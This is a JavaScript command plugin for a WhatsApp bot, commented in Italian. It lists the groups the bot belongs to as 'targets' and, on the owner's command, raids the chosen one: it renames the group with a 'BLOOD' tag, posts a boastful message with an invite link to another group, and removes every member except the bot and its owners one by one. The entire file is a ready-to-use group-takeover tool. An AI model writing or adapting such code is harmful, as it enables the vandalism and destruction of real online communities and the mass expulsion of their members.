let handler = async (m, { conn, text, command }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    // 1. RECUPERO LISTA GRUPPI
    let getGroups = await conn.groupFetchAllParticipating();
    let groups = Object.values(getGroups);
    
    if (groups.length === 0) return m.reply("❌ Il bot non è in alcun gruppo.");

    // 2. MOSTRA LISTA
    if (!text) {
        let txt = "😈 *LISTA TARGET DISPONIBILI:*\n\n";
        groups.forEach((g, i) => {
            txt += `*${i + 1}.* ${g.subject}\n`;
        });
        txt += `\n👉 Scrivi: *.${command} [numero]*`;
        return m.reply(txt);
    }

    // 3. SELEZIONE BERSAGLIO
    let index = parseInt(text) - 1;
    if (isNaN(index) || !groups[index]) return m.reply("❌ Numero non valido.");

    let targetChat = groups[index].id;
    let targetName = groups[index].subject;

    await m.reply(`🚀 *ATTACCO AVVIATO SU:* ${targetName}\nAttendere...`);

    try {
        // 4. REFRESH METADATI (Forzato dai server WA)
        let metadata = await conn.groupMetadata(targetChat, true);
        let participants = metadata.participants;

        // A. AZIONI ESTETICHE (Nome e Messaggio)
        await conn.groupUpdateSubject(targetChat, `${targetName} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`).catch(() => {});
        await conn.sendMessage(targetChat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭ο 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓Ο.\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri"
        });

        // B. FILTRO PARTECIPANTI (Escluso solo Bot e Owner)
        let usersToRemove = participants
            .map(p => p.id)
            .filter(jid => jid !== botId && !ownerJids.includes(jid));

        if (usersToRemove.length === 0) return m.reply("⚠️ Nessun utente da rimuovere.");

        // C. RIMOZIONE FORZATA (Ciclo Singolo)
        let count = 0;
        for (let jid of usersToRemove) {
            try {
                // Proviamo a rimuovere l'utente
                let response = await conn.groupParticipantsUpdate(targetChat, [jid], 'remove');
                
                // Se la risposta indica successo (solitamente un array con lo status 200)
                if (response[0]?.status === '200' || response[0]?.status === 200) {
                    count++;
                }
                
                // Delay minimo per non saturare la connessione (300ms)
                await new Promise(res => setTimeout(res, 300));
            } catch (err) {
                // Se fallisce (es. utente è admin), il bot continua senza bloccarsi
                console.log(`Salto utente ${jid} (probabile admin o errore)`);
            }
        }

        await m.reply(`✅ *TARGET:* ${targetName}\n*UTENTI RIMOSSI:* ${count}/${usersToRemove.length}`);

    } catch (e) {
        console.error(e);
        await m.reply("❌ Errore fatale: Il bot è stato rimosso o ha perso i permessi.");
    }
};

handler.command = ['fotti'];
handler.owner = true;
handler.private = true; 

export default handler;
